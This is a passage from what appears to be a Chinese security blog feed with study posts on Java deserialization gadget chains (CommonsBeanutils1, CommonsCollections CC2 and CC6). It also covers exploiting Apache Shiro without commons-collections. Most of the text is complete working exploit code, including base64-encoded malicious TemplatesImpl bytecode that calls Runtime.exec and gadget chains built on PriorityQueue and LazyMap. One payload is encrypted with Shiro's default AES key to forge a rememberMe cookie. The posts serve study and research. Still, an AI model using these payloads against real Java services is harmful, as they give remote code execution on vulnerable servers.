class="hljs-string">&quot;bnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABG1haW4BABYoW0xqYXZh&quot;</span> +<br>                <span class="hljs-string">&quot;L2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsHACsBAAY8aW5pdD4B&quot;</span> +<br>                <span class="hljs-string">&quot;AAMoKVYBAApTb3VyY2VGaWxlAQAWVGVtcGxhdGVzSW1wbFRlc3QuamF2YQEAHW9yZy9sY2RtMTIz&quot;</span> +<br>                <span class="hljs-string">&quot;L1RlbXBsYXRlc0ltcGxUZXN0DAAfACAHACwMAC0ALgEAEGdub21lLWNhbGN1bGF0b3IMAC8AMAEA&quot;</span> +<br>                <span class="hljs-string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +<br>                <span class="hljs-string">&quot;VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNs&quot;</span> +<br>                <span class="hljs-string">&quot;ZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +<br>                <span class="hljs-string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +<br>                <span class="hljs-string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAABAAgACQACAAoAAAA/AAAAAwAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAGxAAAAAgALAAAABgABAAAADwAMAAAAIAADAAAAAQANAA4AAAAAAAEADwAQAAEAAAABABEAEgAC&quot;</span> +<br>                <span class="hljs-string">&quot;ABMAAAAEAAEAFAABAAgAFQACAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAFAAMAAAAKgAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAQANAA4AAAAAAAEADwAQAAEAAAABABYAFwACAAAAAQAYABkAAwATAAAABAABABQACQAaABsA&quot;</span> +<br>                <span class="hljs-string">&quot;AgAKAAAANwACAAEAAAAJuwABWbcAAlexAAAAAgALAAAACgACAAAAFwAIABgADAAAAAwAAQAAAAkA&quot;</span> +<br>                <span class="hljs-string">&quot;HAAdAAAAEwAAAAQAAQAeAAEAHwAgAAIACgAAAEAAAgABAAAADiq3AAO4AAQSBbYABlexAAAAAgAL&quot;</span> +<br>                <span class="hljs-string">&quot;AAAADgADAAAAGQAEABoADQAbAAwAAAAMAAEAAAAOAA0ADgAAABMAAAAEAAEAHgABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl template =<span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(template,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(template,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br><br>        <span class="hljs-keyword">final</span> BeanComparator comp = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-keyword">null</span>,String.CASE_INSENSITIVE_ORDER);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">3</span>,comp);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(comp,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> Object[]&#123;template, template&#125;);<br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queue);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">byte</span>[] payload = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        ByteSource byteSource = aes.encrypt(payload,key);<br>        System.out.println(byteSource.toString());<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功执行了命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118000823383.png" alt="image-20211118000823383"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118000557586.png" alt="image-20211118000557586"></p><p>虽然感觉变化的不多，但是这里利用的东西却不少，发现还有一些其他的代替方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118001128482.png" alt="image-20211118001128482"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java CommonsBeanutils1</title>
    <link href="/2021/11/17/Java-CommonsBeanutils1/"/>
    <url>/2021/11/17/Java-CommonsBeanutils1/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsBeanutils与无commons-collections的shiro反序列化利用"><a href="#CommonsBeanutils与无commons-collections的shiro反序列化利用" class="headerlink" title="CommonsBeanutils与无commons-collections的shiro反序列化利用"></a>CommonsBeanutils与无commons-collections的shiro反序列化利用</h1><h2 id="JavaBean类"><a href="#JavaBean类" class="headerlink" title="JavaBean类"></a>JavaBean类</h2><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680</a></p><p>JavaBean是特殊的java类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> is;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setIs</span><span class="hljs-params">(<span class="hljs-keyword">boolean</span> is)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.is = is;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isIs</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> is;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有个公有属性，并存在读取和设置着两个属性的方法（bool 类型的方法不一样）又称为 getter 和 setter。其中getter 的方法名以get开头，setter的方法名以set开头</p><p>commons-beanutils 中提供了一个静态方法<code>PropertyUtils.getProperty</code> 可以调用任意 JavaBean 的 getter 方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-params">new</span> People()</span>, <span class="hljs-string">&quot;name&quot;</span>);<br></code></pre></td></tr></table></figure><p>这里<code>commons-beanutils</code>会自动找到People类的<code>getName()</code>，它还支持递归调用属性。比如a对象中有属性b，b对象 中有属性c，我们可以通过 PropertyUtils.getProperty(a, “b.c”); 的方式进行递归获取。通过这个 方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。</p><h2 id="getter-的使用"><a href="#getter-的使用" class="headerlink" title="getter 的使用"></a>getter 的使用</h2><p>在<code>org.apache.commons.beanutils.BeanComparator</code>中有一个<code>compare()</code>方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117141851422.png" alt="image-20211117141851422"></p><p>这里发现调用了<code>getProperty()</code>这里就看看能不能调用到某个方法的getter方法</p><p>在之前提到了 TemplatesImpl 类加载字节码时分析到过一个<code>getOutputProperties()</code>方法</p><p><a href="http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/">http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</a></p><p>而 getOutputProperties 这个名字，是以 get 开头，正符合getter的定义。所以在<code>PropertyUtils.getProperty( o1, property )</code> 这段代码中，当o1是一个<code>TemplatesImpl</code>对现象，并且<code>property</code>的值为<code>outputProperties</code>时，将会自动调用getter也就是<code>TemplatesImpl#getOutputProperties()</code>方法触发了代码执行。</p><h2 id="反序列化链构造"><a href="#反序列化链构造" class="headerlink" title="反序列化链构造"></a>反序列化链构造</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CBTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAJdHJhbnNmb3JtAQByKExj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAE&quot;</span> +<br>                <span class="hljs-string">&quot;Q29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABVMb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2xjZG0xMjMvUnVuRXhlYzsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4v&quot;</span> +<br>                <span class="hljs-string">&quot;aW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1s&quot;</span> +<br>                <span class="hljs-string">&quot;L2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcA&quot;</span> +<br>                <span class="hljs-string">&quot;KgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29y&quot;</span> +<br>                <span class="hljs-string">&quot;Zy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYB&quot;</span> +<br>                <span class="hljs-string">&quot;AAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span> +<br>                <span class="hljs-string">&quot;SXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3Nl&quot;</span> +<br>                <span class="hljs-string">&quot;cmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwcAKwEABjxpbml0PgEAAygpVgEAClNv&quot;</span> +<br>                <span class="hljs-string">&quot;dXJjZUZpbGUBAAxSdW5FeGVjLmphdmEBABNvcmcvbGNkbTEyMy9SdW5FeGVjDAAfACAHACwMAC0A&quot;</span> +<br>                <span class="hljs-string">&quot;LgEABGNhbGMMAC8AMAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9y&quot;</span> +<br>                <span class="hljs-string">&quot;dW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9s&quot;</span> +<br>                <span class="hljs-string">&quot;YW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEA&quot;</span> +<br>                <span class="hljs-string">&quot;JyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAABAAgA&quot;</span> +<br>                <span class="hljs-string">&quot;CQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAADgAMAAAAIAADAAAAAQANAA4AAAAAAAEA&quot;</span> +<br>                <span class="hljs-string">&quot;DwAQAAEAAAABABEAEgACABMAAAAEAAEAFAABAAgAFQACAAoAAABJAAAABAAAAAGxAAAAAgALAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;BgABAAAAEgAMAAAAKgAEAAAAAQANAA4AAAAAAAEADwAQAAEAAAABABYAFwACAAAAAQAYABkAAwAT&quot;</span> +<br>                <span class="hljs-string">&quot;AAAABAABABQACQAaABsAAgAKAAAANwACAAEAAAAJuwABWbcAAlexAAAAAgALAAAACgACAAAAFQAI&quot;</span> +<br>                <span class="hljs-string">&quot;ABYADAAAAAwAAQAAAAkAHAAdAAAAEwAAAAQAAQAeAAEAHwAgAAIACgAAAEAAAgABAAAADiq3AAO4&quot;</span> +<br>                <span class="hljs-string">&quot;AAQSBbYABlexAAAAAgALAAAADgADAAAAFwAEABgADQAZAAwAAAAMAAEAAAAOAA0ADgAAABMAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAEAHgABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl template =<span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(template,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(template,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        BeanComparator comp = <span class="hljs-keyword">new</span> BeanComparator();<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">3</span>,comp);<br>        <span class="hljs-comment">/*queue.add(template);</span><br><span class="hljs-comment">        queue.add(template);*/</span><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        setFieldValue(comp,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> Object[]&#123;template, template&#125;);<br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queue);<br>        objectOutputStream.close();<br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117182424431.png" alt="image-20211117182424431"></p><h2 id="链子的问题"><a href="#链子的问题" class="headerlink" title="链子的问题"></a>链子的问题</h2><p>为啥直接使用<code>queue.add(template)</code>添加不能执行命令？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117215608791.png" alt="image-20211117215608791"></p><p>经过调试发现，如果直接使用<code>add(template)</code>代码执行到这里就会中断</p><p>对于<code>queue</code>变量，它使用的是transient反序列化没有影响？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117211534512.png" alt="image-20211117211534512"></p><p>反序列化时发现已经恢复了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117220932223.png" alt="image-20211117220932223"></p><p>应该是在readObject()方法中恢复</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117221844437.png" alt="image-20211117221844437"></p><p>执行完之后就赋值了</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java CC2</title>
    <link href="/2021/11/17/Java-CC2/"/>
    <url>/2021/11/17/Java-CC2/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-CC2"><a href="#Java-CC2" class="headerlink" title="Java CC2"></a>Java CC2</h1><p>Apache Commons Collections 是一个著名的辅助开发库，里面包含了一些java中没有的数据结构和辅助方法。2015年底commons-collections反序列化利用链被提出时，Apache Commons Collections有以下两 个分⽀版本：</p><ul><li>commons-collections:commons-collections </li><li>org.apache.commons:commons-collections4</li></ul><p>对于3.2.1版本中的反序列化链，再4中会有吗？</p><p>这里利用CC6的链再4中测试根据这里</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">compare</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transform = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformer);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.lazyMap(inerMap,chainedTransformer);<br><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        HashMap hashMap = <span class="hljs-keyword">new</span> HashMap();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;lcdm&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        setFieldValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transform);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br><br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj,String fieldname,Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj,value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116133112622.png" alt="image-20211116133112622"></p><p>上的POC中主要的变化地点就是<code>LazyMap</code>类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116165719174.png" alt="image-20211116165719174"></p><h2 id="PriorityQueue链"><a href="#PriorityQueue链" class="headerlink" title="PriorityQueue链"></a>PriorityQueue链</h2><p>CommonsCollections2 链子中利用到的两个关键类是</p><ul><li><code>java.util.PriorityQueue</code></li><li><code>org.apache.commons.collections4.comparators.TransformingComparator</code></li></ul><p>在<code>java.util.PriorityQueue</code>中的<code>readObject()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117004436710.png" alt="image-20211117004436710"></p><p><code>org.apache.commons.collections4.comparators.TransformingComparator</code> 在这个类中我们发现了在<code>compare()</code>中调用了<code>transform()</code>函数，所以这里就构想能否通过<code>java.util.PriorityQueue</code>中的<code>readObject()</code>的调用到此函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117005426579.png" alt="image-20211117005426579"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117005038847.png" alt="image-20211117005038847"></p><p>从<code>java.util.PriorityQueue</code>中的<code>readObject()</code>中的<code>heapify()</code>跟下去</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117005741759.png" alt="image-20211117005741759"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117005823062.png" alt="image-20211117005823062"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117005914843.png" alt="image-20211117005914843"></p><p>在这里发现在<code>siftDownUsingComparator()</code>里面调用了<code>compare()</code>函数</p><p>POC 编写</p><figure class="highlight java"><table><tr><td 